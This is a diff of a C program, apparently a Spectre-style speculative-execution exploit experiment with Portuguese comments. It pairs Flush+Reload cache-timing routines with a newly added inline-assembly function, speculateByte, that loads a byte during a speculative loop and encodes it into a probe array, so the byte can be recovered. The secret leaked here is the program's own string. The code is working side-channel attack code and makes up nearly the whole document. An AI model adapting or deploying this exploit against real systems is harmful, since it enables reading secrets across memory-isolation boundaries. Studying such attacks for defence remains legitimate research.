@@ -4,9 +4,9 @@
 #define NUM_ITERACOES 10
 #define CACHE_LINE_LEN	128
 #define LEN_MEM_ARRAY	50
+#define TRIAL_TIMES	 1000
 
-
-static inline void Flush(char *);
+static inline void Flush(void *);
 
 unsigned GetDS(){
 	unsigned ds;
@@ -32,7 +32,7 @@ char p1[] = 	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 		"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 
 
-static inline long ProbeFlush(char *addr) {
+static inline long ProbeFlush(void *addr) {
 	/*ignora as otimizacoes*/
 	volatile unsigned long tempo;
 	/*exploit quase original*/
@@ -54,7 +54,7 @@ static inline long ProbeFlush(char *addr) {
 }
 
 
-static inline long Probe(char *addr) {
+static inline long Probe(void *addr) {
 	/*ignora as otimizacoes*/
 	volatile unsigned long tempo;
 	/*exploit quase original*/
@@ -74,7 +74,7 @@ static inline long Probe(char *addr) {
   return tempo;
 }
 
-static inline void Flush(char *addr)
+static inline void Flush(void *addr)
 {
 	asm __volatile__(
 			"mfence		;"
@@ -89,10 +89,10 @@ static inline void Flush(char *addr)
 
 
 
-unsigned Treshold(char *baseSrc)
+unsigned Treshold(void *baseSrc)
 {
 
-	char* base=baseSrc;
+	void* base=baseSrc;
 	unsigned i=0;
 	unsigned j=0;
 	unsigned probe;
@@ -151,7 +151,7 @@ static inline int FindSecretLineCache(void *baseSrc,unsigned treshold,int lista[
 	unsigned tempo;
 	int i=0;
 	int c=0;
-	while (i<256)
+	while (i<255)
 	{
 		
 		
@@ -171,32 +171,85 @@ static inline int FindSecretLineCache(void *baseSrc,unsigned treshold,int lista[
 
 }
 
-void fillArrayMemSpace(char *memspace[],char *original[])
+void fillArrayMemSpace(void *memspace[],void *original[])
 {
 	//avoid calling clflush all the time.
-	char *bufferFill;
+	void *bufferFill;
 	for(int i=0;i<LEN_MEM_ARRAY;i++)
 	{
 		
-		bufferFill=(char *)malloc(4096*256+0xFFFFFF);
+		bufferFill=malloc(4096*256+0xFFFFFF);
 		original[i]=bufferFill;
 		bufferFill+=0xFFFFFF;
-		bufferFill=(char *)((unsigned long)bufferFill & 0xFFFFFFFFF000000);
+		bufferFill=(void *)((unsigned long)bufferFill & 0xFFFFFFFFF000000);
 		memspace[i]=bufferFill;
 	}
 }
+static inline void speculateByte(void *addr,void *base)
+{
+	int pseudoAlvo=255;
+	int pseudoAlvo2=10;
+	void *lista[TRIAL_TIMES+1];
+	int x;
+	int i;
+	for (i=0 ; i<TRIAL_TIMES ; i++)
+	{
+		lista[i]=&pseudoAlvo;
+	}
+	lista[TRIAL_TIMES]=&pseudoAlvo2; //evil!!!
 
+	//printf("tamanho de void= %i\n",sizeof(void *));
+	//especulamos o indice 256, q é o endereço maligno;
+	asm __volatile__(
+			"mov %0 , %%rbx			\n" 	//probeArray
+			"mov %1 , %%rcx			\n"	   //array de proibidos
+			"mov $0,%%rsi					\n"
+			"_read_loop:					\n"
+			"						\n"	
+			"	xor %%rdx,%%rdx				\n"
+			"	mov (%%rcx,%%rsi,0x8),%%rax			\n" //rax agora contem o addr possivel de ataque
+
+
+			"	add $87212,%%rsi				\n"
+			"	sub $87212,%%rsi				\n"
+			"	add $88212,%%rsi				\n"
+			"	sub $88212,%%rsi				\n"
+
+
+			"	cmp $1000,%%rsi				\n"
+			"	jz _fim_loop				\n"
+			"	mov (%%rax),%%dl			\n" //especulado dl = segredo
+			"	shl $12,%%rdx				\n" //dl*4096+baseProbe acesso o dado
+			"	mov (%%rbx,%%rdx),%%rdi				\n"
+			"	inc %%rsi				\n"
+			"					\n"
+			"					\n"
+			"					\n"
+			"					\n"
+			"					\n"
+			"					\n"
+			"					\n"
+			"_fim_loop:					\n"
+			"	nop				\n"
+
+			: : "r" (base) , "r" (lista)
+			
+			);
+
+
+}
 int main(void)
 {
 	int ret,i;
 	int lista[256];
 	unsigned treshold;
-	char *ptrArray;
-	
+	void *ptrArray;
+	void *addr;
+
 	char *segredo="isso eh secreto, esse texto eh realmente muito longo. Cuidado com instrucoes especuladas";
 
-	char *memspace[LEN_MEM_ARRAY];
-	char *original[LEN_MEM_ARRAY];
+	void *memspace[LEN_MEM_ARRAY];
+	void *original[LEN_MEM_ARRAY];
 
 	fillArrayMemSpace(memspace,original);
 
@@ -207,8 +260,13 @@ int main(void)
 	{
 	
 		ptrArray=memspace[i];
-		ret=*((int *)(ptrArray+(int)segredo[i-1]*4096));
+		addr=(void *)segredo+(i-1);
+		
+		speculateByte(addr,ptrArray);
+		
+		//ret=*((int *)(ptrArray+(int)segredo[i-1]*4096));
 		FindSecretLineCache(ptrArray,treshold,lista);
+		
 		PrintLista(lista);
 		FlushAll(ptrArray);
 		free(original[i]);	
